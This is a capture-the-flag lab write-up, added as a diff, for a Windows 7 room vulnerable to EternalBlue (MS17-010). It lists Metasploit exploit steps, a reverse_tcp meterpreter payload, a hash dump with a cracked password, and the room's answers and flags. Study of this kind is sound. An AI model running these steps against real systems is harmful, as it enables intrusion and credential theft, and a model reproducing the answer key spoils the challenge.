@@ -1,0 +1,47 @@
+**Date:** 2026-06-10
+**Status:** Completed
+
+## Answers:
+
+| Task | Question | Answer |
+|------|----------|--------|
+| Task 1 | How many ports are open with a port number under 1000? | 3 |
+| Task 1 | What is this machine vulnerable to? | ms17-010 |
+| Task 2 | What is the full path of the exploitation code? | exploit/windows/smb/ms17_010_eternalblue |
+| Task 2 | What is the name of the required value to set? | RHOSTS |
+| Task 3 | What is the name of the post module to convert shell to meterpreter? | post/multi/manage/shell_to_meterpreter |
+| Task 3 | What option are we required to change? | SESSION |
+| Task 4 | What is the name of the non-default user? | Jon |
+| Task 4 | What is the cracked password? | alqfna22 |
+| Task 5 | Flag1 (system root) | flag{access_the_machine} |
+| Task 5 | Flag2 (passwords storage location) | flag{sam_database_elevated_access} |
+| Task 5 | Flag3 (administrator documents) | flag{admin_documents_can_be_valuable} |
+
+## What I Learned:
+
+**EternalBlue (MS17-010)**
+- This is an SMB vulnerability in Windows that allows remote code execution
+- It was used in the WannaCry ransomware attack in 2017
+- Nmap can detect this vulnerability using the script `smb-vuln-ms17-010.nse`
+
+**Metasploit Exploitation Steps**
+1. Search for the exploit: `search ms17-010`
+2. Use the exploit: `use exploit/windows/smb/ms17_010_eternalblue`
+3. Set RHOSTS to the target IP address
+4. Set payload: `set payload windows/x64/meterpreter/reverse_tcp`
+5. Run the exploit: `run`
+
+**Post-Exploitation**
+- After getting a regular shell, convert to meterpreter using `post/multi/manage/shell_to_meterpreter`
+- The SESSION option must be set to the current session ID
+- Dump password hashes using `hashdump` command
+- Crack NTLM hashes with John the Ripper or online tools
+- Jon's hash `ffb43f0de35be4d9917ac0cc8ad57f8d` cracks to password `alqfna22`
+
+**Flag Locations**
+- Flag 1: Located in the system root (C:\)
+- Flag 2: Found in the Config folder where password SAM files are stored
+- Flag 3: Located in the Administrator's Documents folder
+
+## Summary:
+This room targets a Windows 7 machine vulnerable to EternalBlue (MS17-010). Using Metasploit, I gained initial access via the SMB exploit, upgraded to a meterpreter shell, dumped NTLM hashes, cracked Jon's password, and found three flags in key system locations including the root directory, SAM database location, and administrator's documents.
